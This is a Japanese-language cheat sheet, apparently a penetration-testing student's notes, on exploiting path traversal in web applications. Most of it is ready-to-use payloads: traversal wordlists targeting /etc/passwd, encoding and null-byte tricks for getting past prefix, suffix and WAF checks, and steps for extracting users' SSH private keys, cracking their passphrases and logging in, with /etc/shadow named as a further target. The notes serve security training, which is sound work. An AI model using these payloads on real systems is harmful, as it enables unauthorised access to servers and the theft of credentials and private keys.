###### Traversal sequences

- Unix → `../`
- Windows → `../` or `..\`（`\` or  `%5C`）
	- (`C:\`は指定不要)
	- 例：`..\..\xampp\apache\logs`

つまり、==スラッシュ・バックスラッシュのどちらも試すこと。==

# 基本

## 流れ

1. 動作確認のため、`/etc/passwd`を検出する
	- Windowsの場合: `C:\windows\system32\drivers\etc\hosts`
2. 有効なペイロード(トラバーサルシーケンス)がわかったら、閲覧したいファイルを検出する

💡Tips：`/etc/passwd`は検出できて`/home/carlos/secret`が検出できない場合は、WAFをバイパスするためにHV: `urlencode_all`する。↓例
```
/image?filename=<@urlencode_all>../../home/carlos/secret<@/urlencode_all>
```

###### /etc/passwdのtraversal wordlist（☑️Url encode these charactersをopt-outすること）
```
/etc/passwd
../etc/passwd
../../etc/passwd
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd
../../../../../../etc/passwd
../../../../../../../etc/passwd
....//etc/passwd
....//....//etc/passwd
....//....//....//etc/passwd
....//....//....//....//etc/passwd
....//....//....//....//....//etc/passwd
....//....//....//....//....//....//etc/passwd
....//....//....//....//....//....//....//etc/passwd
%2e%2e/etc/passwd
%2e%2e/%2e%2e/etc/passwd
%2e%2e/%2e%2e/%2e%2e/etc/passwd
%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
..%252fetc/passwd
..%252f..%252fetc/passwd
..%252f..%252f..%252fetc/passwd
..%252f..%252f..%252f..%252fetc/passwd
..%252f..%252f..%252f..%252f..%252fetc/passwd
..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd
..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd
```

## 手法
#### No defenceの場合

- 値を直接、[⚡️Path traversal](#/etc/passwdのtraversal%20wordlist)でbrute-force
```
/image?filename=§§
```

#### Prefix validationの場合

- `?filename=/var/www/images/36.jpg `みたいに元々絶対パス指定のとき
- 元の正常な値のうしろでpath traversalを実行する（[⚡️Path traversal](#/etc/passwdのtraversal%20wordlist)で）
```
/image?filename=10.jpg§§
```

#### Suffix validationの場合

- 上記2つでうまくいかなかった場合
- null byteを使用する（[⚡️Path traversal](#/etc/passwdのtraversal%20wordlist)で）
```
/image?filename=§§%00
```

⚠️複数のクエリを渡すには`&`を使う（例：`/image?filename=a.png../../shell.php&cmd=id`)

---

# SSH private keyの抽出

初期侵入ができていない段階で有効

1. [⚡️Path traversal](#手法)に従い、`/etc/passwd`を抽出し、ユーザーとそのhome directoryをメモ（`/home/<username>`）
```
user:x:1000:1000:user,,,:/home/<username>:/usr/bin/zsh
```

2. home directory配下の秘密鍵を抽出
	- id_rsa以外にもある：[22 - SSH](../../../OSCP/Cheatsheet/Ports%20-%20Service/22%20-%20SSH.md#SSH%20Private%20Keyの種類)
```
../../../../../../../../../home/<username>/.ssh/id_rsa
```

3. 秘密鍵を使ってSSHサーバーにアクセスする
	- パスフレーズがあればssh2johnでクラックを試みる：[🐈‍⬛Password Crack - JtR・Hashcat](../../../OSCP/Tools/🐈‍⬛Password%20Crack%20-%20JtR・Hashcat.md#ハッシュ値の整形)


-  その他、`/etc/shadow`なども抽出の候補となり得る